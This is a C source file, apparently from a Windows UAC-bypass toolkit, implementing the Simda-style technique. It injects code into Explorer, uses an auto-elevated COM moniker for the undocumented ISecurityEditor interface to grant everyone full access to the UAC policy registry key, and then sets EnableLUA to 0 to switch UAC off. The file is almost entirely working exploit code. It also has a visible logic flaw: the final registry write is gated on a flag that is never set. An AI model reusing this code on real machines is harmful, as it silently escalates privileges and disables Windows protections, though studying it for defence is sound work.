/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2016
*
*  TITLE:       SIMDA.C
*
*  VERSION:     2.00
*
*  DATE:        16 Nov 2015
*
*  Simda based UAC bypass using ISecurityEditor.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

ELOAD_PARAMETERS_2 g_ElevParams2;

/*
* ucmElevatedAlterSecurityProc
*
* Purpose:
*
* Change object security through ISecurityEditor(SetNamedInfo).
*
*/
DWORD WINAPI ucmElevatedAlterSecurityProc(
	PELOAD_PARAMETERS_2 elvpar
	)
{
	HRESULT				r;
	BOOL				cond = FALSE;
	ISecurityEditor		*SecurityEditor1 = NULL;
	BIND_OPTS3			bop;
	LPOLESTR			pps;

	if (elvpar == NULL) {
		return (DWORD)E_FAIL;
	}

	r = elvpar->xCoInitialize(NULL);
	if (r != S_OK) {
		return r;
	}

	RtlSecureZeroMemory(&bop, sizeof(bop));

	do {
		r = elvpar->xCoCreateInstance(&elvpar->xCLSID_ShellSecurityEditor, NULL,
			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
			&elvpar->xIID_ISecurityEditor, &SecurityEditor1);

		if (r != S_OK) {
			break;
		}

		if (SecurityEditor1 != NULL) {
			SecurityEditor1->lpVtbl->Release(SecurityEditor1);
		}

		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = CLSCTX_LOCAL_SERVER;

		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, 
			&elvpar->xIID_ISecurityEditor, &SecurityEditor1);

		if (r != S_OK)
			break;
		if (SecurityEditor1 == NULL) {
			r = E_FAIL;
			break;
		}

		pps = NULL;
		r = SecurityEditor1->lpVtbl->GetSecurity(
			SecurityEditor1,
			elvpar->szTargetObject,
			elvpar->ObjectType,
			elvpar->SecurityInformation,
			&pps
			);

		if ((r == S_OK) && (pps != NULL)) {
			elvpar->xOutputDebugStringW(pps);
		}

		r = SecurityEditor1->lpVtbl->SetSecurity(
			SecurityEditor1,
			elvpar->szTargetObject,
			elvpar->ObjectType,
			elvpar->SecurityInformation,
			elvpar->szNewSDDL
			);

		if (r == S_OK) {
			elvpar->xOutputDebugStringW(elvpar->szNewSDDL);
		}


	} while (cond);

	if (SecurityEditor1 != NULL) {
		SecurityEditor1->lpVtbl->Release(SecurityEditor1);
	}

	elvpar->xCoUninitialize();

	return r;
}

/*
* ucmSimdaAlterObjectSecurity
*
* Purpose:
*
* Set new entry in object DACL.
*
*/
BOOL ucmSimdaAlterObjectSecurity(
	SE_OBJECT_TYPE ObjectType,
	SECURITY_INFORMATION SecurityInformation,
	LPWSTR lpTargetObject,
	LPWSTR lpSddlString
	)
{
	BOOL    cond = FALSE, bResult = FALSE;
	SIZE_T  cch;

	//just a basic check
	if (
		(lpTargetObject == NULL) ||
		(lpSddlString == NULL)
		)
	{
		return FALSE;
	}

	cch = _strlen_w(lpTargetObject);
	if ((cch == 0) || (cch > MAX_PATH)) {
		return FALSE;
	}
	cch = _strlen_w(lpSddlString);
	if ((cch == 0) || (cch > MAX_PATH)) {
		return FALSE;
	}


	do {

		_strcpy_w(g_ElevParams2.EleMoniker, L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}");
		_strcpy_w(g_ElevParams2.szTargetObject, lpTargetObject);
		_strcpy_w(g_ElevParams2.szNewSDDL, lpSddlString);

		if (CLSIDFromString(L"{4D111E08-CBF7-4f12-A926-2C7920AF52FC}",
			&g_ElevParams2.xCLSID_ShellSecurityEditor) != NOERROR)
		{
			break;
		}

		if (IIDFromString(L"{14B2C619-D07A-46EF-8B62-31B64F3B845C}",
			&g_ElevParams2.xIID_ISecurityEditor) != S_OK)
		{
			break;
		}

		g_ElevParams2.ObjectType = ObjectType;
		g_ElevParams2.SecurityInformation = SecurityInformation;
		g_ElevParams2.xCoInitialize = (pfnCoInitialize)GetProcAddress(g_ctx.hOle32, "CoInitialize");
		g_ElevParams2.xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(g_ctx.hOle32, "CoCreateInstance");
		g_ElevParams2.xCoGetObject = (pfnCoGetObject)GetProcAddress(g_ctx.hOle32, "CoGetObject");
		g_ElevParams2.xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ctx.hOle32, "CoUninitialize");
		g_ElevParams2.xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ctx.hKernel32, "OutputDebugStringW");

		bResult = ucmInjectExplorer(&g_ElevParams2, ucmElevatedAlterSecurityProc);

	} while (cond);

	return bResult;
}

/*
* ucmSimdaTurnOffUac
*
* Purpose:
*
* Disable UAC using AutoElevated undocumented ISecurityEditor interface.
* Used by WinNT/Simda starting from 2010 year till today.
*
*/
BOOL ucmSimdaTurnOffUac(
	VOID
	)
{
	BOOL		cond = FALSE, bResult = FALSE;
	DWORD		dwValue;
	LRESULT		lRet;
	HKEY		hKey;

	do {

		if (!ucmSimdaAlterObjectSecurity(
			SE_REGISTRY_KEY,
			DACL_SECURITY_INFORMATION,
			T_UACKEY,
			T_SDDL_ALL_FOR_EVERYONE)
			)
		{
			break;
		}

		if (bResult) {
		
			lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,	TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system"), 
				0, KEY_ALL_ACCESS, &hKey);
			if ((lRet == ERROR_SUCCESS) && (hKey != NULL)) {
				OutputDebugString(TEXT("[UCM] Key security compromised"));
				dwValue = 0;
				RegSetValueEx(hKey, TEXT("EnableLUA"), 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
				RegCloseKey(hKey);
			}
		}

	} while (cond);

	return bResult;
}
